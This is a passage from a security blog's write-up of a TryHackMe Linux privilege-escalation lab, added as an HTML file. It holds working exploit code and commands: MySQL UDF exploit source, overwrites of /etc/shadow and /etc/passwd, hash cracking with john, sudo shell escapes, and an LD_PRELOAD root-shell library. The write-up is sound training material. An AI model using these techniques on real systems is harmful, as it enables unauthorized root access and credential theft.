@@ -1,0 +1,558 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.0"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Writeup for TryHackMe room - Linux Privesc" /><meta name="author" content="4n3i5v74" /><meta property="og:locale" content="en_US" /><meta name="description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><meta property="og:description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><link rel="canonical" href="https://4n3i5v74.github.io/posts/tryhackme-linux-privesc/" /><meta property="og:url" content="https://4n3i5v74.github.io/posts/tryhackme-linux-privesc/" /><meta property="og:site_name" content="4n3i5v74" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-03T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup for TryHackMe room - Linux Privesc" /><meta name="twitter:site" content="@nive1103" /><meta name="twitter:creator" content="@4n3i5v74" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"4n3i5v74"},"headline":"Writeup for TryHackMe room - Linux Privesc","dateModified":"2021-05-13T23:09:48+05:30","datePublished":"2021-04-03T00:00:00+05:30","description":"A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups.","url":"https://4n3i5v74.github.io/posts/tryhackme-linux-privesc/","mainEntityOfPage":{"@type":"WebPage","@id":"https://4n3i5v74.github.io/posts/tryhackme-linux-privesc/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Writeup for TryHackMe room - Linux Privesc | 4n3i5v74</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/local.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/copy-code.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">4n3i5v74</a></div><div class="site-subtitle font-italic">A Security Blog.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/4n3i5v74" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span>Posts</span> <span>Writeup for TryHackMe room - Linux Privesc</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup for TryHackMe room - Linux Privesc</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Apr 3, 2021, 12:00 AM +0530" > Apr 3 <i class="unloaded">2021-04-03T00:00:00+05:30</i> </span> by <span class="author"> 4n3i5v74 </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, May 13, 2021, 11:09 PM +0530" > May 13 <i class="unloaded">2021-05-13T23:09:48+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3884 words">21 min</span></div></div><div class="post-content"><div class="flex-container"> <script src="https://tryhackme.com/badge/34685"></script></div><h2 id="linux-privesc"><a href="https://tryhackme.com/room/linuxprivesc" target="_blank">Linux Privesc</a></h2><p>This room contains detailed info about linux privilege escalation methods.</p><p>For complete tryhackme path, refer the <a href="https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/" target="_blank">link</a>. Refer <a href="https://4n3i5v74.github.io/posts/tryhackme-common-linux-privesc/" target="_blank">link</a> for quick reference on <code>linux privilege escalation</code>.</p><h2 id="task-1---deploy-the-vulnerable-debian-vm">Task 1 - Deploy the Vulnerable Debian VM</h2><h3 id="references">References</h3><ul><li><a href="https://github.com/sagishahar/lpeworkshop" target="_blank">Linux Privilege Escalation Workshop</a></ul><h2 id="task-2---service-exploits">Task 2 - Service Exploits</h2><h3 id="references-1">References</h3><ul><li><a href="https://www.exploit-db.com/exploits/1518" target="_blank">MySQL UDF exploit</a><li><a href="https://github.com/mysqludf" target="_blank">MySQL UDF reference</a></ul><p>Login to the target using credentials <code>user:password321</code>.</p><p>Compile the raptor_udf2.c exploit code.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gcc%20-g%20-c%20raptor_udf2.c%20-fPIC%0Agcc%20-g%20-shared%20-Wl,-soname,raptor_udf2.so%20-o%20raptor_udf2.so%20raptor_udf2.o%20-lc" type="button"></button></div></div><pre><code>gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</code></pre><p>The exploit code is similar to below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#include%20%3Cstdio.h%3E%0A#include%20%3Cstdlib.h%3E%0A%0Aenum%20Item_result%20%7BSTRING_RESULT,%20REAL_RESULT,%20INT_RESULT,%20ROW_RESULT%7D;%0A%0Atypedef%20struct%20st_udf_args%20%7B%0A%20%20%20%20unsigned%20int%09%09arg_count;%09//%20number%20of%20arguments%0A%20%20%20%20enum%20Item_result%09*arg_type;%09//%20pointer%20to%20item_result%0A%20%20%20%20char%20%09%09%09**args;%09%09//%20pointer%20to%20arguments%0A%20%20%20%20unsigned%20long%09%09*lengths;%09//%20length%20of%20string%20args%0A%20%20%20%20char%09%09%09*maybe_null;%09//%201%20for%20maybe_null%20args%0A%7D%20UDF_ARGS;%0A%0Atypedef%20struct%20st_udf_init%20%7B%0A%20%20%20%20char%09%09%09maybe_null;%09//%201%20if%20func%20can%20return%20NULL%0A%20%20%20%20unsigned%20int%09%09decimals;%09//%20for%20real%20functions%0A%20%20%20%20unsigned%20long%20%09%09max_length;%09//%20for%20string%20functions%0A%20%20%20%20char%09%09%09*ptr;%09%09//%20free%20ptr%20for%20func%20data%0A%20%20%20%20char%09%09%09const_item;%09//%200%20if%20result%20is%20constant%0A%7D%20UDF_INIT;%0A%0Aint%20do_system(UDF_INIT%20*initid,%20UDF_ARGS%20*args,%20char%20*is_null,%20char%20*error)%0A%7B%0A%20%20%20%20if%20(args-%3Earg_count%20!=%201)%0A%20%20%20%20%20%20%20%20return(0);%0A%20%20%20%20system(args-%3Eargs[0]);%0A%20%20%20%20return(0);%0A%7D%0A%0Achar%20do_system_init(UDF_INIT%20*initid,%20UDF_ARGS%20*args,%20char%20*message)%0A%7B%0A%20%20%20%20return(0);%0A%7D" type="button"></button></div></div><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
+
+typedef struct st_udf_args {
+    unsigned int		arg_count;	// number of arguments
+    enum Item_result	*arg_type;	// pointer to item_result
+    char 			**args;		// pointer to arguments
+    unsigned long		*lengths;	// length of string args
+    char			*maybe_null;	// 1 for maybe_null args
+} UDF_ARGS;
+
+typedef struct st_udf_init {
+    char			maybe_null;	// 1 if func can return NULL
+    unsigned int		decimals;	// for real functions
+    unsigned long 		max_length;	// for string functions
+    char			*ptr;		// free ptr for func data
+    char			const_item;	// 0 if result is constant
+} UDF_INIT;
+
+int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
+{
+    if (args-&gt;arg_count != 1)
+        return(0);
+    system(args-&gt;args[0]);
+    return(0);
+}
+
+char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{
+    return(0);
+}
+</code></pre><p>Connect to <code>mysql</code> with blank password, using <code>mysql -u root</code>, and execute the following commands to create a <code>User Defined Function (UDF)</code> named <code>do_system</code> using compiled exploit.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="use%20mysql;%0Acreate%20table%20foo(line%20blob);%0Ainsert%20into%20foo%20values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));%0Aselect%20*%20from%20foo%20into%20dumpfile%20'/usr/lib/mysql/plugin/raptor_udf2.so';%0Acreate%20function%20do_system%20returns%20integer%20soname%20'raptor_udf2.so';" type="button"></button></div></div><pre><code>use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+</code></pre><p>Use the function to copy <code>/bin/bash</code> to <code>/tmp/rootbash</code> and set the <code>suid</code> permission.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="select%20do_system('cp%20/bin/bash%20/tmp/rootbash;%20chmod%20+xs%20/tmp/rootbash');" type="button"></button></div></div><pre><code>select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+</code></pre><p>Exit out of <code>mysql</code> shell using <code>\q</code>.</p><p>Use the newly created <code>bash</code> binary to spawn <code>privileged shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="/tmp/rootbash%20-p" type="button"></button></div></div><pre><code>/tmp/rootbash -p
+</code></pre><h2 id="task-3---weak-file-permissions---readable-etcshadow">Task 3 - Weak File Permissions - Readable /etc/shadow</h2><p>The file <code>/etc/shadow</code> is readable, and if any of the password is based on dictionary word, it can be cracked easily.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="-rw-r--rw-%201%20root%20shadow%20837%20Aug%2025%20%202019%20/etc/shadow" type="button"></button></div></div><pre><code>-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+</code></pre><p>The entry for <code>root</code> user in <code>/etc/shadow</code> can be extracted separately for <code>john the ripper</code> and attempted to be cracked.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::" type="button"></button></div></div><pre><code>root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+</code></pre><p>Use <code>john</code> to crack the password.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="john%20--wordlist=/usr/share/wordlists/rockyou.txt%20hash.txt" type="button"></button></div></div><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Warning:%20detected%20hash%20type%20%22sha512crypt%22,%20but%20the%20string%20is%20also%20recognized%20as%20%22sha512crypt-opencl%22%0AUse%20the%20%22--format=sha512crypt-opencl%22%20option%20to%20force%20loading%20these%20as%20that%20type%20instead%0AUsing%20default%20input%20encoding:%20UTF-8%0ALoaded%201%20password%20hash%20(sha512crypt,%20crypt(3)%20$6$%20[SHA512%20256/256%20AVX2%204x])%0ACost%201%20(iteration%20count)%20is%205000%20for%20all%20loaded%20hashes%0AWill%20run%202%20OpenMP%20threads%0APress%20'q'%20or%20Ctrl-C%20to%20abort,%20almost%20any%20other%20key%20for%20status%0A%3Cpassword%3E%20%20%20%20%20%20(root)%0A1g%200:00:00:00%20DONE%20(2021-04-25%2004:50)%201.265g/s%201944p/s%201944c/s%201944C/s%20cuties..mexico1%0AUse%20the%20%22--show%22%20option%20to%20display%20all%20of%20the%20cracked%20passwords%20reliably%0ASession%20completed." type="button"></button></div></div><pre><code>Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
+Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+&lt;password&gt;      (root)
+1g 0:00:00:00 DONE (2021-04-25 04:50) 1.265g/s 1944p/s 1944c/s 1944C/s cuties..mexico1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</code></pre><h2 id="task-4---weak-file-permissions---writable-etcshadow">Task 4 - Weak File Permissions - Writable /etc/shadow</h2><p>The file <code>/etc/shadow</code> is writable, and it can be exploited by manually editing any password entry.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="-rw-r--rw-%201%20root%20shadow%20837%20Aug%2025%20%202019%20/etc/shadow" type="button"></button></div></div><pre><code>-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+</code></pre><p>Create a new encrypted <code>sha-512</code> password.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="mkpasswd%20-m%20sha-512%20testpwd" type="button"></button></div></div><pre><code>mkpasswd -m sha-512 testpwd
+</code></pre><p>Replace the existing entry for <code>root</code> user in <code>/etc/shadow</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="root:$6$9TBP0gf1$ODrD17ec0Da0SpOamlBUKdBDkzwugq1tGeB5jFPuFa.2gziqndwMmUi6EKNQ/xwajz/leHfTtrpNvC2COiOlT0:17298:0:99999:7:::" type="button"></button></div></div><pre><code>root:$6$9TBP0gf1$ODrD17ec0Da0SpOamlBUKdBDkzwugq1tGeB5jFPuFa.2gziqndwMmUi6EKNQ/xwajz/leHfTtrpNvC2COiOlT0:17298:0:99999:7:::
+</code></pre><p>Switch to <code>root</code> user using password <code>testpwd</code> to validate.</p><h2 id="task-5---weak-file-permissions---writable-etcpasswd">Task 5 - Weak File Permissions - Writable /etc/passwd</h2><p>The file <code>/etc/passwd</code> is writable, and it can be exploited by manually editing any entry.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="-rw-r--rw-%201%20root%20root%201009%20Aug%2025%20%202019%20/etc/passwd" type="button"></button></div></div><pre><code>-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
+</code></pre><p>Create a new encrypted password.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="openssl%20passwd%20testpwd" type="button"></button></div></div><pre><code>openssl passwd testpwd
+</code></pre><p>Replace the entry <code>*</code> for user <code>root</code> in the file <code>/etc/passwd</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="root:Cm47jzRd1DLZU:0:0:root:/root:/bin/bash" type="button"></button></div></div><pre><code>root:Cm47jzRd1DLZU:0:0:root:/root:/bin/bash
+</code></pre><p>Switch to <code>root</code> user using password <code>testpwd</code> to validate.</p><h2 id="task-6---sudo---shell-escape-sequences">Task 6 - Sudo - Shell Escape Sequences</h2><h3 id="references-2">References</h3><ul><li><a href="https://gtfobins.github.io/" target="_blank">Gtfobins reference</a></ul><p>Check the sudo capabilities using <code>sudo -l</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Matching%20Defaults%20entries%20for%20user%20on%20this%20host:%0A%20%20%20%20env_reset,%20env_keep+=LD_PRELOAD,%20env_keep+=LD_LIBRARY_PATH%0A%0AUser%20user%20may%20run%20the%20following%20commands%20on%20this%20host:%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/sbin/iftop%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/find%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/nano%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/vim%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/man%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/awk%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/less%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/ftp%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/nmap%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/sbin/apache2%0A%20%20%20%20(root)%20NOPASSWD:%20/bin/more" type="button"></button></div></div><pre><code>Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+</code></pre><p>The binary <code>iftop</code> can be exploited using <code>sudo iftop</code> and executing <code>!/bin/sh</code>.</p><p>The binary <code>find</code> can be exploited using <code>sudo find . -exec /bin/sh \; -quit</code>.</p><p>The binary <code>vim</code> can be exploited using <code>sudo vim -c ':!/bin/sh'</code>.</p><p>The binary <code>man</code> can be exploited using <code>sudo man man</code> and executing <code>!/bin/sh</code>.</p><p>The binary <code>awk</code> can be exploited using <code>sudo awk 'BEGIN {system("/bin/sh")}'</code>.</p><p>The binary <code>nmap</code> can be exploited using <code>sudo nmap --interactive</code> and executing <code>!/bin/sh</code>.</p><h2 id="task-7---sudo---environment-variables">Task 7 - Sudo - Environment Variables</h2><ul><li>LD_PRELOAD and LD_LIBRARY_PATH are inherited from user’s environment.<li>LD_PRELOAD loads a shared object before any others when a program is run.<li>LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.</ul><p>Check the sudo capabilities using <code>sudo -l</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Matching%20Defaults%20entries%20for%20user%20on%20this%20host:%0A%20%20%20%20env_reset,%20env_keep+=LD_PRELOAD,%20env_keep+=LD_LIBRARY_PATH%0A%0AUser%20user%20may%20run%20the%20following%20commands%20on%20this%20host:%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/sbin/iftop%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/find%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/nano%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/vim%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/man%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/awk%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/less%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/ftp%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/bin/nmap%0A%20%20%20%20(root)%20NOPASSWD:%20/usr/sbin/apache2%0A%20%20%20%20(root)%20NOPASSWD:%20/bin/more" type="button"></button></div></div><pre><code>Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+</code></pre><p>Create a shared object using the exploit code, to exploit using path variable <code>LD_PRELOAD</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gcc%20-fPIC%20-shared%20-nostartfiles%20-o%20/tmp/preload.so%20/home/user/tools/sudo/preload.c" type="button"></button></div></div><pre><code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+</code></pre><p>The exploit code is similar to below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#include%20%3Cstdio.h%3E%0A#include%20%3Csys/types.h%3E%0A#include%20%3Cstdlib.h%3E%0A%0Avoid%20_init()%20%7B%0A%20%20%20%20unsetenv(%22LD_PRELOAD%22);%0A%20%20%20%20setresuid(0,0,0);%0A%20%20%20%20system(%22/bin/bash%20-p%22);%0A%7D" type="button"></button></div></div><pre><code>#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
